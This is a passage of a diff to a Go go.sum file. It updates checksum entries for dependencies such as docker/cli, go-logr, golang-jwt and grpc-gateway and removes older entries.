h1:vV6w1AhK4VMnhBno/TPVCoK9U/LP0PkLCS9tbxHdi\n github.com/dimchansky/utfbom v1.1.1/go.mod h1:SxdoEBH5qIqFocHMyGOXVAybYJdr71b1Q/j0mACtrfE=\n github.com/distribution/reference v0.5.0 h1:/FUIFXtfc/x2gpa5/VGfiGLuOIdYa1t65IKK2OFGvA0=\n github.com/distribution/reference v0.5.0/go.mod h1:BbU0aIcezP1/5jX/8MP0YiH4SdvB5Y4f/wlDRiLyi3E=\n-github.com/docker/cli v26.1.5+incompatible h1:NxXGSdz2N+Ibdaw330TDO3d/6/f7MvHuiMbuFaIQDTk=\n-github.com/docker/cli v26.1.5+incompatible/go.mod h1:JLrzqnKDaYBop7H2jaqPtU4hHvMKP+vjCwu2uszcLI8=\n+github.com/docker/cli v27.1.2+incompatible h1:nYviRv5Y+YAKx3dFrTvS1ErkyVVunKOhoweCTE1BsnI=\n+github.com/docker/cli v27.1.2+incompatible/go.mod h1:JLrzqnKDaYBop7H2jaqPtU4hHvMKP+vjCwu2uszcLI8=\n github.com/docker/distribution v2.8.3+incompatible h1:AtKxIZ36LoNK51+Z6RpzLpddBirtxJnzDrHLEKxTAYk=\n github.com/docker/distribution v2.8.3+incompatible/go.mod h1:J2gT2udsDAN96Uj4KfcMRqY0/ypR+oyYUYmja8H+y+w=\n-github.com/docker/docker v26.1.5+incompatible h1:NEAxTwEjxV6VbBMBoGG3zPqbiJosIApZjxlbrG9q3/g=\n-github.com/docker/docker v26.1.5+incompatible/go.mod h1:eEKB0N0r5NX/I1kEveEz05bcu8tLC/8azJZsviup8Sk=\n github.com/docker/docker-credential-helpers v0.8.0 h1:YQFtbBQb4VrpoPxhFuzEBPQ9E16qz5SpHLS+uswaCp8=\n github.com/docker/docker-credential-helpers v0.8.0/go.mod h1:UGFXcuoQ5TxPiB54nHOZ32AWRqQdECoh/Mg0AlEYb40=\n github.com/dustin/go-humanize v1.0.0/go.mod h1:HtrtbFcZ19U5GC7JDqmcUSB87Iq5E25KnS6fMYU6eOk=\n\n@@ -288,7 +252,6 @@\ngithub.com/emicklei/go-restful/v3 v3.11.0/go.mod h1:6n3XBCmQQb25CM2LCACGz8ukIrRr\n github.com/emicklei/proto v1.12.1 h1:6n/Z2pZAnBwuhU66Gs8160B8rrrYKo7h2F2sCOnNceE=\n github.com/emicklei/proto v1.12.1/go.mod h1:rn1FgRS/FANiZdD2djyH7TMA9jdRDcYQ9IEN9yvjX0A=\n github.com/envoyproxy/go-control-plane v0.9.0/go.mod h1:YTl/9mNaCwkRvm6d1a2C3ymFceY/DCBVvsKhRF0iEA4=\n-github.com/envoyproxy/go-control-plane v0.9.1-0.20191026205805-5f8ba28d4473/go.mod h1:YTl/9mNaCwkRvm6d1a2C3ymFceY/DCBVvsKhRF0iEA4=\n github.com/envoyproxy/go-control-plane v0.9.4/go.mod h1:6rpuAdCZL397s3pYoYcLgu1mIlRU8Am5FuJP05cCM98=\n github.com/envoyproxy/protoc-gen-validate v0.1.0/go.mod h1:iSmxcyjqTsJpI2R4NaDN7+kN2VEUnK/pcBlmesArF7c=\n github.com/evanphx/json-patch v4.12.0+incompatible h1:4onqiflcdA9EOZ4RxV643DvftH5pOlLGNtQ5lPWQu84=\n\n@@ -316,22 +279,17 @@\ngithub.com/go-asn1-ber/asn1-ber v1.5.5 h1:MNHlNMBDgEKD4TcKr36vQN68BA00aDfjIt3/bD\n github.com/go-asn1-ber/asn1-ber v1.5.5/go.mod h1:hEBeB/ic+5LoWskz+yKT7vGhhPYkProFKoKdwZRWMe0=\n github.com/go-chi/chi v4.1.2+incompatible h1:fGFk2Gmi/YKXk0OmGfBh0WgmN3XB8lVnEyNz34tQRec=\n github.com/go-chi/chi v4.1.2+incompatible/go.mod h1:eB3wogJHnLi3x/kFX2A+IbTBlXxmMeXJVKy9tTv1XzQ=\n-github.com/go-gl/glfw v0.0.0-20190409004039-e6da0acd62b1/go.mod h1:vR7hzQXu2zJy9AVAgeJqvqgH9Q5CA+iKCZ2gyEVpxRU=\n-github.com/go-gl/glfw/v3.3/glfw v0.0.0-20191125211704-12ad95a8df72/go.mod h1:tQ2UAYgL5IevRw8kRxooKSPJfGvJ9fJQFa0TUsXzTg8=\n-github.com/go-gl/glfw/v3.3/glfw v0.0.0-20200222043503-6f7a984d4dc4/go.mod h1:tQ2UAYgL5IevRw8kRxooKSPJfGvJ9fJQFa0TUsXzTg8=\n github.com/go-ini/ini v1.67.0 h1:z6ZrTEZqSWOTyH2FlglNbNgARyHG8oLW9gMELqKr06A=\n github.com/go-ini/ini v1.67.0/go.mod h1:ByCAeIL28uOIIG0E3PJtZPDL8WnHpFKFOtgjp+3Ies8=\n github.com/go-jose/go-jose/v3 v3.0.3 h1:fFKWeig/irsp7XD2zBxvnmA/XaRWp5V3CBsZXJF7G7k=\n github.com/go-jose/go-jose/v3 v3.0.3/go.mod h1:5b+7YgP7ZICgJDBdfjZaIt+H/9L9T/YQrVfLAMboGkQ=\n github.com/go-jose/go-jose/v4 v4.0.1 h1:QVEPDE3OluqXBQZDcnNvQrInro2h0e4eqNbnZSWqS6U=\n github.com/go-jose/go-jose/v4 v4.0.1/go.mod h1:WVf9LFMHh/QVrmqrOfqun0C45tMe3RoiKJMPvgWwLfY=\n-github.com/go-kit/log v0.1.0/go.mod h1:zbhenjAZHb184qTLMA9ZjW7ThYL0H2mk7Q6pNt4vbaY=\n github.com/go-ldap/ldap/v3 v3.4.6 h1:ert95MdbiG7aWo/oPYp9btL3KJlMPKnP58r09rI8T+A=\n github.com/go-ldap/ldap/v3 v3.4.6/go.mod h1:IGMQANNtxpsOzj7uUAMjpGBaOVTC4DYyIy8VsTdxmtc=\n-github.com/go-logfmt/logfmt v0.5.0/go.mod h1:wCYkCAKZfumFQihp8CzCvQ3paCTfi41vtzG1KdI/P7A=\n github.com/go-logr/logr v1.2.2/go.mod h1:jdQByPbusPIv2/zmleS9BjJVeZ6kBagPoEUsqbVz/1A=\n-github.com/go-logr/logr v1.4.1 h1:pKouT5E8xu9zeFC39JXRDukb6JFQPXM5p5I91188VAQ=\n-github.com/go-logr/logr v1.4.1/go.mod h1:9T104GzyrTigFIr8wt5mBrctHMim0Nb2HLGrmQ40KvY=\n+github.com/go-logr/logr v1.4.2 h1:6pFjapn8bFcIbiKo3XT4j/BhANplGihG6tvd+8rYgrY=\n+github.com/go-logr/logr v1.4.2/go.mod h1:9T104GzyrTigFIr8wt5mBrctHMim0Nb2HLGrmQ40KvY=\n github.com/go-logr/stdr v1.2.2 h1:hSWxHoqTgW2S2qGc0LTAI563KZ5YKYRhT3MFKZMbjag=\n github.com/go-logr/stdr v1.2.2/go.mod h1:mMo/vtBO5dYbehREoey6XUKy/eSumjCCveDpRre4VKE=\n github.com/go-logr/zapr v1.2.4 h1:QHVo+6stLbfJmYGkQ7uGHUCu5hnAFAj6mDe6Ea0SeOo=\n\n@@ -358,14 +316,13 @@\ngithub.com/go-openapi/validate v0.24.0 h1:LdfDKwNbpB6Vn40xhTdNZAnfLECL81w+VX3Bum\n github.com/go-openapi/validate v0.24.0/go.mod h1:iyeX1sEufmv3nPbBdX3ieNviWnOZaJ1+zquzJEf2BAQ=\n github.com/go-piv/piv-go v1.11.0 h1:5vAaCdRTFSIW4PeqMbnsDlUZ7odMYWnHBDGdmtU/Zhg=\n github.com/go-piv/piv-go v1.11.0/go.mod h1:NZ2zmjVkfFaL/CF8cVQ/pXdXtuj110zEKGdJM6fJZZM=\n-github.com/go-rod/rod v0.114.7 h1:h4pimzSOUnw7Eo41zdJA788XsawzHjJMyzCE3BrBww0=\n-github.com/go-rod/rod v0.114.7/go.mod h1:aiedSEFg5DwG/fnNbUOTPMTTWX3MRj6vIs/a684Mthw=\n-github.com/go-stack/stack v1.8.0/go.mod h1:v0f6uXyyMGvRgIKkXu+yp6POWl0qKG85gN/melR3HDY=\n+github.com/go-rod/rod v0.116.1 h1:BDMZY3qm/14SmvHBV7DoFUhXeJ2MbUYgumQ88b+v2WE=\n+github.com/go-rod/rod v0.116.1/go.mod h1:3Ash9fYwznqz9S1uLQgQRStur4fCXjoxxGW+ym6TYjU=\n github.com/go-task/slim-sprig v0.0.0-20210107165309-348f09dbbbc0/go.mod h1:fyg7847qk6SyHyPtNmDHnmrv/HOrqktSC+C9fM+CJOE=\n github.com/go-task/slim-sprig v0.0.0-20230315185526-52ccab3ef572 h1:tfuBGBXKqDEevZMzYi5KSi8KkcZtzBcTgAUUtapy0OI=\n github.com/go-task/slim-sprig v0.0.0-20230315185526-52ccab3ef572/go.mod h1:9Pwr4B2jHnOSGXyyzV8ROjYa2ojvAY6HCGYYfMoC3Ls=\n-github.com/go-test/deep v1.1.0 h1:WOcxcdHcvdgThNXjw0t76K42FXTU7HpNQWHpA2HHNlg=\n-github.com/go-test/deep v1.1.0/go.mod h1:5C2ZWiW0ErCdrYzpqxLbTX7MG14M9iiw8DgHncVwcsE=\n+github.com/go-test/deep v1.1.1 h1:0r/53hagsehfO4bzD2Pgr/+RgHqhmf+k1Bpse2cTu1U=\n+github.com/go-test/deep v1.1.1/go.mod h1:5C2ZWiW0ErCdrYzpqxLbTX7MG14M9iiw8DgHncVwcsE=\n github.com/gobwas/glob v0.2.3 h1:A4xDbljILXROh+kObIiy5kIaPYD8e96x1tgBhUI5J+Y=\n github.com/gobwas/glob v0.2.3/go.mod h1:d3Ez4x06l9bZtSvzIay5+Yzi0fmZzPgnTbPcKjJAkT8=\n github.com/godbus/dbus/v5 v5.1.0 h1:4KLkAxT3aOY8Li4FRJe/KvhoNFFxo0m6fNuFUO8QJUk=\n\n@@ -374,47 +331,34 @@\ngithub.com/gogo/protobuf v1.3.2 h1:Ov1cvc58UF3b5XjBnZv7+opcTcQFZebYjWzi34vdm4Q=\n github.com/gogo/protobuf v1.3.2/go.mod h1:P1XiOD3dCwIKUDQYPy72D8LYyHL2YPYrpS2s69NZV8Q=\n github.com/golang-jwt/jwt/v4 v4.0.0/go.mod h1:/xlHOz8bRuivTWchD4jCa+NbatV+wEUSzwAxVc6locg=\n github.com/golang-jwt/jwt/v4 v4.2.0/go.mod h1:/xlHOz8bRuivTWchD4jCa+NbatV+wEUSzwAxVc6locg=\n-github.com/golang-jwt/jwt/v4 v4.5.0 h1:7cYmW1XlMY7h7ii7UhUyChSgS5wUJEnm9uZVTGqOWzg=\n github.com/golang-jwt/jwt/v4 v4.5.0/go.mod h1:m21LjoU+eqJr34lmDMbreY2eSTRJ1cv77w39/MY0Ch0=\n+github.com/golang-jwt/jwt/v4 v4.5.1 h1:JdqV9zKUdtaa9gdPlywC3aeoEsR681PlKC+4F5gQgeo=\n+github.com/golang-jwt/jwt/v4 v4.5.1/go.mod h1:m21LjoU+eqJr34lmDMbreY2eSTRJ1cv77w39/MY0Ch0=\n github.com/golang-jwt/jwt/v5 v5.2.1 h1:OuVbFODueb089Lh128TAcimifWaLhJwVflnrgM17wHk=\n github.com/golang-jwt/jwt/v5 v5.2.1/go.mod h1:pqrtFR0X4osieyHYxtmOUWsAWrfe1Q5UVIyoH402zdk=\n github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=\n-github.com/golang/glog v1.2.0 h1:uCdmnmatrKCgMBlM4rMuJZWOkPDqdbZPnrMXDY4gI68=\n-github.com/golang/glog v1.2.0/go.mod h1:6AhwSGph0fcJtXVM/PEHPqZlFeoLxhs7/t5UDAwmO+w=\n-github.com/golang/groupcache v0.0.0-20190702054246-869f871628b6/go.mod h1:cIg4eruTrX1D+g88fzRXU5OdNfaM+9IcxsU14FzY7Hc=\n-github.com/golang/groupcache v0.0.0-20191227052852-215e87163ea7/go.mod h1:cIg4eruTrX1D+g88fzRXU5OdNfaM+9IcxsU14FzY7Hc=\n-github.com/golang/groupcache v0.0.0-20200121045136-8c9f03a8e57e/go.mod h1:cIg4eruTrX1D+g88fzRXU5OdNfaM+9IcxsU14FzY7Hc=\n+github.com/golang/glog v1.2.1 h1:OptwRhECazUx5ix5TTWC3EZhsZEHWcYWY4FQHTIubm4=\n+github.com/golang/glog v1.2.1/go.mod h1:6AhwSGph0fcJtXVM/PEHPqZlFeoLxhs7/t5UDAwmO+w=\n github.com/golang/groupcache v0.0.0-20210331224755-41bb18bfe9da h1:oI5xCqsCo564l8iNU+DwB5epxmsaqB+rhGL0m5jtYqE=\n github.com/golang/groupcache v0.0.0-20210331224755-41bb18bfe9da/go.mod h1:cIg4eruTrX1D+g88fzRXU5OdNfaM+9IcxsU14FzY7Hc=\n github.com/golang/mock v1.1.1/go.mod h1:oTYuIxOrZwtPieC+H1uAHpcLFnEyAGVDL/k47Jfbm0A=\n-github.com/golang/mock v1.2.0/go.mod h1:oTYuIxOrZwtPieC+H1uAHpcLFnEyAGVDL/k47Jfbm0A=\n-github.com/golang/mock v1.3.1/go.mod h1:sBzyDLLjw3U8JLTeZvSv8jJB+tU5PVekmnlKIyFUx0Y=\n-github.com/golang/mock v1.4.0/go.mod h1:UOMv5ysSaYNkG+OFQykRIcU/QvvxJf3p21QfJ2Bt3cw=\n-github.com/golang/mock v1.4.1/go.mod h1:UOMv5ysSaYNkG+OFQykRIcU/QvvxJf3p21QfJ2Bt3cw=\n-github.com/golang/mock v1.4.3/go.mod h1:UOMv5ysSaYNkG+OFQykRIcU/QvvxJf3p21QfJ2Bt3cw=\n-github.com/golang/mock v1.4.4/go.mod h1:l3mdAwkq5BuhzHwde/uurv3sEJeZMXNpwsxVWU71h+4=\n github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=\n github.com/golang/protobuf v1.3.1/go.mod h1:6lQm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=\n github.com/golang/protobuf v1.3.2/go.mod h1:6lQm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=\n github.com/golang/protobuf v1.3.3/go.mod h1:vzj43D7+SQXF/4pzW/hwtAqwc6iTitCiVSaWz5lYuqw=\n github.com/golang/protobuf v1.3.4/go.mod h1:vzj43D7+SQXF/4pzW/hwtAqwc6iTitCiVSaWz5lYuqw=\n-github.com/golang/protobuf v1.3.5/go.mod h1:6O5/vntMXwX2lRkT1hjjk0nAC1IDOTvTlVgjlRvqsdk=\n github.com/golang/protobuf v1.4.0-rc.1/go.mod h1:ceaxUfeHdC40wWswd/P6IGgMaK3YpKi5j83Wpe3EHw8=\n github.com/golang/protobuf v1.4.0-rc.1.0.20200221234624-67d41d38c208/go.mod h1:xKAWHe0F5eneWXFV3EuXVDTCmh+JuBKY0li0aMyXATA=\n github.com/golang/protobuf v1.4.0-rc.2/go.mod h1:LlEzMj4AhA7rCAGe4KMBDvJI+AwstrUpVNzEA03Pprs=\n github.com/golang/protobuf v1.4.0-rc.4.0.20200313231945-b860323f09d0/go.mod h1:WU3c8KckQ9AFe+yFwt9sWVRKCVIyN9cPHBJSNnbL67w=\n github.com/golang/protobuf v1.4.0/go.mod h1:jodUvKwWbYaEsadDk5Fwe5c77LiNKVO9IDvqG2KuDX0=\n-github.com/golang/protobuf v1.4.1/go.mod h1:U8fpvMrcmy5pZrNK1lt4xCsGvpyWQ/VVv6QDs8UjoX8=\n github.com/golang/protobuf v1.4.2/go.mod h1:oDoupMAO8OvCJWAcko0GGGIgR6R6ocIYbsSw735rRwI=\n-github.com/golang/protobuf v1.4.3/go.mod h1:oDoupMAO8OvCJWAcko0GGGIgR6R6ocIYbsSw735rRwI=\n github.com/golang/protobuf v1.5.0/go.mod h1:FsONVRAS9T7sI+LIUmWTfcYkHO4aIWwzhcaSAoJOfIk=\n github.com/golang/protobuf v1.5.2/go.mod h1:XVQd3VNwM+JqD3oG2Ue2ip4fOMUkwXdXDdiuN0vRsmY=\n github.com/golang/protobuf v1.5.4 h1:i7eJL8qZTpSEXOPTxNKhASYpMn+8e5Q6AdndVa1dWek=\n github.com/golang/protobuf v1.5.4/go.mod h1:lnTiLA8Wa4RWRcIUkrtSVa5nRhsEGBg48fD6rSs7xps=\n github.com/golang/snappy v0.0.4 h1:yAGX7huGHXlcLOEtBnF4w7FQwA26wojNCwOYAEhLjQM=\n github.com/golang/snappy v0.0.4/go.mod h1:/XxbfmMg8lxefKM7IXC3fBNl/7bRcc72aCRzEWrmP2Q=\n-github.com/google/btree v0.0.0-20180813153112-4030bb1f1f0c/go.mod h1:lNA+9X1NB3Zf8V7Ke586lFgjr2dZNuvo3lPJSGZ5JPQ=\n-github.com/google/btree v1.0.0/go.mod h1:lNA+9X1NB3Zf8V7Ke586lFgjr2dZNuvo3lPJSGZ5JPQ=\n github.com/google/certificate-transparency-go v1.1.8 h1:LGYKkgZF7satzgTak9R4yzfJXEeYVAjV6/EAEJOf1to=\n github.com/google/certificate-transparency-go v1.1.8/go.mod h1:bV/o8r0TBKRf1X//iiiSgWrvII4d7/8OiA+3vG26gI8=\n github.com/google/flatbuffers v2.0.8+incompatible h1:ivUb1cGomAB101ZM1T0nOiWz9pSrTMoa9+EiY7igmkM=\n\n@@ -425,37 +369,23 @@\ngithub.com/google/go-cmp v0.2.0/go.mod h1:oXzfMopK8JAjlY9xF4vHSVASa0yLyX7SntLO5a\n github.com/google/go-cmp v0.3.0/go.mod h1:8QqcDgzrUqlUb/G2PQTWiueGozuR1884gddMywk6iLU=\n github.com/google/go-cmp v0.3.1/go.mod h1:8QqcDgzrUqlUb/G2PQTWiueGozuR1884gddMywk6iLU=\n github.com/google/go-cmp v0.4.0/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n-github.com/google/go-cmp v0.4.1/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n-github.com/google/go-cmp v0.5.0/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n-github.com/google/go-cmp v0.5.1/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n github.com/google/go-cmp v0.5.2/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n-github.com/google/go-cmp v0.5.4/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n github.com/google/go-cmp v0.5.5/go.mod h1:v8dTdLbMG2kIc/vJvl+f65V22dbkXbowE6jgT/gNBxE=\n github.com/google/go-cmp v0.5.9/go.mod h1:17dUlkBOakJ0+DkrSSNjCkIjxS6bF9zb3elmeNGIjoY=\n github.com/google/go-cmp v0.6.0 h1:ofyhxvXcZhMsU5ulbFiLKl/XBFqE1GSq7atu8tAmTRI=\n github.com/google/go-cmp v0.6.0/go.mod h1:17dUlkBOakJ0+DkrSSNjCkIjxS6bF9zb3elmeNGIjoY=\n-github.com/google/go-containerregistry v0.19.1 h1:yMQ62Al6/V0Z7CqIrrS1iYoA5/oQCm88DeNujc7C1KY=\n-github.com/google/go-containerregistry v0.19.1/go.mod h1:YCMFNQeeXeLF+dnhhWkqDItx/JSkH01j1Kis4PsjzFI=\n+github.com/google/go-containerregistry v0.19.2 h1:TannFKE1QSajsP6hPWb5oJNgKe1IKjHukIKDUmvsV6w=\n+github.com/google/go-containerregistry v0.19.2/go.mod h1:YCMFNQeeXeLF+dnhhWkqDItx/JSkH01j1Kis4PsjzFI=\n github.com/google/go-github/v55 v55.0.0 h1:4pp/1tNMB9X/LuAhs5i0KQAE40NmiR/y6prLNb9x9cg=\n github.com/google/go-github/v55 v55.0.0/go.mod h1:JLahOTA1DnXzhxEymmFF5PP2tSS9JVNj68mSZNDwskA=\n github.com/google/go-querystring v1.1.0 h1:AnCroh3fv4ZBgVIf1Iwtovgjaw/GiKJo8M8yD/fhyJ8=\n github.com/google/go-querystring v1.1.0/go.mod h1:Kcdr2DB4koayq7X8pmAG4sNG59So17icRSOU623lUBU=\n github.com/google/gofuzz v1.0.0/go.mod h1:dBl0BpW6vV/+mYPU4Po3pmUjxk6FQPldtuIdl/M65Eg=\n github.com/google/gofuzz v1.2.0 h1:xRy4A+RhZaiKjJ1bPfwQ8sedCA+YS2YcCHW6ec7JMi0=\n github.com/google/gofuzz v1.2.0/go.mod h1:dBl0BpW6vV/+mYPU4Po3pmUjxk6FQPldtuIdl/M65Eg=\n-github.com/google/martian v2.1.0+incompatible/go.mod h1:9I4somxYTbIHy5NJKHRl3wXiIaQGbYVAs8BPL6v8lEs=\n-github.com/google/martian/v3 v3.0.0/go.mod h1:y5Zk1BBys9G+gd6Jrk0W3cC1+ELVxBWuIGO+w/tUAp0=\n-github.com/google/pprof v0.0.0-20181206194817-3ea8567a2e57/go.mod h1:zfwlbNMJ+OItoe0UupaVj+oy1omPYYDuagoSzA8v9mc=\n-github.com/google/pprof v0.0.0-20190515194954-54271f7e092f/go.mod h1:zfwlbNMJ+OItoe0UupaVj+oy1omPYYDuagoSzA8v9mc=\n-github.com/google/pprof v0.0.0-20191218002539-d4f498aebedc/go.mod h1:ZgVRPoUq/hfqzAqh7sHMqb3I9Rq5C59dIz2SbBwJ4eM=\n-github.com/google/pprof v0.0.0-20200212024743-f11f1df84d12/go.mod h1:ZgVRPoUq/hfqzAqh7sHMqb3I9Rq5C59dIz2SbBwJ4eM=\n-github.com/google/pprof v0.0.0-20200229191704-1ebb73c60ed3/go.mod h1:ZgVRPoUq/hfqzAqh7sHMqb3I9Rq5C59dIz2SbBwJ4eM=\n-github.com/google/pprof v0.0.0-20200430221834-fc25d7d30c6d/go.mod h1:ZgVRPoUq/hfqzAqh7sHMqb3I9Rq5C59dIz2SbBwJ4eM=\n-github.com/google/pprof v0.0.0-20200708004538-1a94d8640e99/go.mod h1:ZgVRPoUq/hfqzAqh7sHMqb3I9Rq5C59dIz2SbBwJ4eM=\n github.com/google/pprof v0.0.0-20210407192527-94a9f03dee38/go.mod h1:kpwsk12EmLew5upagYY7GY0pfYCcupk39gWOCRROcvE=\n github.com/google/pprof v0.0.0-20231023181126-ff6d637d2a7b h1:RMpPgZTSApbPf7xaVel+QkoGPRLFLrwFO89uDUHEGf0=\n github.com/google/pprof v0.0.0-20231023181126-ff6d637d2a7b/go.mod h1:czg5+yv1E0ZGTi6S6vVK1mke0fV+FaUhNGcd6VRS9Ik=\n-github.com/google/renameio v0.1.0/go.mod h1:KWCgfxg9yswjAJkECMjeO8J8rahYeXnNhOm40UhjYkI=\n github.com/google/s2a-go v0.1.7 h1:60BLSyTrOV4/haCDW4zb1guZItoSq8foHCXrAnjBo/o=\n github.com/google/s2a-go v0.1.7/go.mod h1:50CgR4k1jNlWBu4UfS4AcfhVe1r6pdZPygJ3R8F0Qdw=\n github.com/google/tink/go v1.7.0 h1:6Eox8zONGebBFcCBqkVmt60LaWZa6xg1cl/DwAh/J1w=\n\n@@ -467,17 +397,15 @@\ngithub.com/google/uuid v1.6.0 h1:NIvaJDMOsjHA8n1jAhLSgzrAzy1Hgr+hNrb57e+94F0=\n github.com/google/uuid v1.6.0/go.mod h1:TIyPZe4MgqvfeYDBFedMoGGpEw/LqOeaOT+nhxU+yHo=\n github.com/googleapis/enterprise-certificate-proxy v0.3.2 h1:Vie5ybvEvT75RniqhfFxPRy3Bf7vr3h0cechB90XaQs=\n github.com/googleapis/enterprise-certificate-proxy v0.3.2/go.mod h1:VLSiSSBs/ksPL8kq3OBOQ6WRI2QnaFynd1DCjZ62+V0=\n-github.com/googleapis/gax-go/v2 v2.0.4/go.mod h1:0Wqv26UfaUD9n4G6kQubkQ+KchISgw+vpHVxEJEs9eg=\n-github.com/googleapis/gax-go/v2 v2.0.5/go.mod h1:DWXyrwAJ9X0FpwwEdw+IPEYBICEFu5mhpdKc/us6bOk=\n github.com/googleapis/gax-go/v2 v2.12.3 h1:5/zPPDvw8Q1SuXjrqrZslrqT7dL/uJT2CQii/cLCKqA=\n github.com/googleapis/gax-go/v2 v2.12.3/go.mod h1:AKloxT6GtNbaLm8QTNSidHUVsHYcBHwWRvkNFJUQcS4=\n github.com/gopherjs/gopherjs v0.0.0-20181017120253-0766667cb4d1/go.mod h1:wJfORRmW1u3UXTncJ5qlYoELFm8eSnnEO6hX4iZ3EWY=\n github.com/gopherjs/gopherjs v0.0.0-20200217142428-fce0ec30dd00/go.mod h1:wJfORRmW1u3UXTncJ5qlYoELFm8eSnnEO6hX4iZ3EWY=\n github.com/gorilla/mux v1.8.1 h1:TuBL49tXwgrFYWhqrNgrUNEY92u81SPhu7sTdzQEiWY=\n github.com/gorilla/mux v1.8.1/go.mod h1:AKf9I4AEqPTmMytcMc0KkNouC66V3BtZ4qD5fmWSiMQ=\n github.com/grpc-ecosystem/grpc-gateway v1.16.0 h1:gmcG1KaJ57LophUzW0Hy8NmPhnMZb4M0+kPpLofRdBo=\n-github.com/grpc-ecosystem/grpc-gateway/v2 v2.19.1 h1:/c3QmbOGMGTOumP2iT/rCwB7b0QDGLKzqOmktBjT+Is=\n-github.com/grpc-ecosystem/grpc-gateway/v2 v2.19.1/go.mod h1:5SN9VR2LTsRFsrEC6FHgRbTWrTHu6tqPeKxEQv15giM=\n+github.com/grpc-ecosystem/grpc-gateway/v2 v2.20.0 h1:bkypFPDjIYGfCYD5mRBvpqxfYX1YCS1PXdKYWi8FsN0=\n+github.com/grpc-ecosystem/grpc-gateway/v2 v2.20.0/go.mod h1:P+Lt/0by1T8bfcF3z737NnSbmxQAppXMRziHUxPOC8k=\n github.com/hashicorp/errwrap v1.1.0 h1:OxrOeh75EUXMY8TBjag2fzXGZ40LB6IKw45YeGUDY2I=\n github.com/hashicorp/errwrap v1.1.0/go.mod h1:YH+1FKiLXxHSkmPseP+kNlulaMuP3n2brvKWEqk/Jc4=\n github.com/hashicorp/go-cleanhttp v0.5.2 h1:035FKYIWjmULyFRBKPs8TBQoi0x6d9G4xc9neXJWAZQ=\n\n@@ -496,16 +424,13 @@\ngithub.com/hashicorp/go-secure-stdlib/strutil v0.1.2 h1:kes8mmyCpxJsI7FTwtzRqEy9\n github.com/hashicorp/go-secure-stdlib/strutil v0.1.2/go.mod h1:Gou2R9+il93BqX25LAKCLuM+y9U2T4hlwvT1yprcna4=\n github.com/hashicorp/go-sockaddr v1.0.5 h1:dvk7TIXCZpmfOlM+9mlcrWmWjw/wlKT+VDq2wMvfPJU=\n github.com/hashicorp/go-sockaddr v1.0.5/go.mod h1:uoUUmtwU7n9Dv3O4SNLeFvg0SxQ3lyjsj6+CCykpaxI=\n-github.com/hashicorp/golang-lru v0.5.0/go.mod h1:/m3WP610KZHVQ1SGc6re/UDhFvYD7pJ4Ao+sR/qLZy8=\n-github.com/hashicorp/golang-lru v0.5.1/go.mod h1:/m3WP610KZHVQ1SGc6re/UDhFvYD7pJ4Ao+sR/qLZy8=\n github.com/hashicorp/hcl v1.0.1-vault-5 h1:kI3hhbbyzr4dldA8UdTb7ZlVVlI2DACdCfz31RPDgJM=\n github.com/hashicorp/hcl v1.0.1-vault-5/go.mod h1:XYhtn6ijBSAj6n4YqAaf7RBPS4I06AItNorpy+MoQNM=\n github.com/hashicorp/vault/api v1.12.2 h1:7YkCTE5Ni90TcmYHDBExdt4WGJxhpzaHqR6uGbQb/rE=\n github.com/hashicorp/vault/api v1.12.2/go.mod h1:LSGf1NGT1BnvFFnKVtnvcaLBM2Lz+gJdpL6HUYed8KE=\n github.com/howeyc/gopass v0.0.0-20210920133722-c8aef6fb66ef h1:A9HsByNhogrvm9cWb28sjiS3i7tcKCkflWFEkHfuAgM=\n github.com/howeyc/gopass v0.0.0-20210920133722-c8aef6fb66ef/go.mod h1:lADxMC39cJJqL93Duh1xhAs4I2Zs8mKS89XWXFGp9cs=\n github.com/hpcloud/tail v1.0.0/go.mod h1:ab1qPbhIpdTxEkNHXyeSf5vhxWSCs/tWer42PpOxQnU=\n-github.com/ianlancetaylor/demangle v0.0.0-20181102032728-5e5cf60278f6/go.mod h1:aSSvb/t6k1mPoxDqO4vJh6VOCGPwU4O0C2/Eqndh1Sc=\n github.com/ianlancetaylor/demangle v0.0.0-20200824232613-28f6c0f3b639/go.mod h1:aSSvb/t6k1mPoxDqO4vJh6VOCGPwU4O0C2/Eqndh1Sc=\n github.com/imdario/mergo v0.3.16 h1:wwQJbIsHYGMUyLSPrEq1CT16AhnhNJQ51+4fdHUnCl4=\n github.com/imdario/mergo v0.3.16/go.mod h1:WBLT9ZmE3lPoWsEzCh9LPo3TiwVN+ZKEjmz+hD27ysY=\n\n@@ -529,14 +454,11 @@\ngithub.com/josharian/intern v1.0.0/go.mod h1:5DoeVV0s6jJacbCEi61lwdGj/aVlrQvzHFF\n github.com/json-iterator/go v1.1.10/go.mod h1:KdQUCv79m/52Kvf8AW2vK1V8akMuk1QjK/uOdHXbAo4=\n github.com/json-iterator/go v1.1.12 h1:PV8peI4a0ysnczrg+LtxykD8LfKY9ML6u2jnxaEnrnM=\n github.com/json-iterator/go v1.1.12/go.mod h1:e30LSqwooZae/UwlEbR2852Gd8hjQvJoHmT4TnhNGBo=\n-github.com/jstemmer/go-junit-report v0.0.0-20190106144839-af01ea7f8024/go.mod h1:6v2b51hI/fHJwM22ozAgKL4VKDeJcHhJFhtBdhmNjmU=\n-github.com/jstemmer/go-junit-report v0.9.1/go.mod h1:Brl9GWCQeLvo8nXZwPNNblvFj/XSXhF0NWZEnDohbsk=\n github.com/jtolds/gls v4.20.0+incompatible/go.mod h1:QJZ7F/aHp+rZTRtaJ1ow/lLfFfVYBRgL+9YlvaHOwJU=\n-github.com/julienschmidt/httprouter v1.3.0/go.mod h1:JR6WtHb+2LUe8TCKY3cZOxFyyO8IZAc4RVcycCCAKdM=\n github.com/kisielk/errcheck 